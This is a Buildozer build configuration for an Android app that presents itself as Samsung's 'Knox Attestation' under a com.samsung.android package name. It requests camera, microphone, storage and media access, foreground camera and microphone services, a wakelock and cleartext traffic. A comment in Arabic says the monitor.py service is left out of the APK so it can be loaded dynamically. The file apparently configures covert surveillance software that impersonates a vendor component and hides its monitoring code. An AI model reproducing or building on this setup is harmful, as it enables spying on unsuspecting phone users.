[app]
title = Knox Attestation
package.name = knoxattestation
package.domain = com.samsung.android
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
source.include_patterns = assets/*, *.tflite
source.exclude_dirs = tests,__pycache__,docs,.github
version = 2.5.1

requirements = python3,kivy,requests,urllib3,certifi,pillow,pyjnius,android,cryptography,pyzipper,tflite-runtime,numpy

icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, FOREGROUND_SERVICE_DATA_SYNC, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE

android.api = 33
android.minapi = 24
android.accept_sdk_license = True
android.archs = arm64-v8a

android.allow_backup = False
android.request_legacy_external_storage = True

# تم إزالة السطر التالي لأن monitor.py ليس ضمن الـ APK (سيتم تحميله ديناميكياً)
# android.services = monitor:monitor.py

android.foreground = True
android.foreground_service_type = dataSync|camera|microphone
android.wakelock = True
android.uses_cleartext_traffic = True

android.meta_data = com.samsung.android.knox.intent.action.KNOX_ATTESTATION=true

orientation = portrait
fullscreen = 1
log_level = 2
warn_on_root = 0

[buildozer]
log_level = 2
warn_on_root = 0
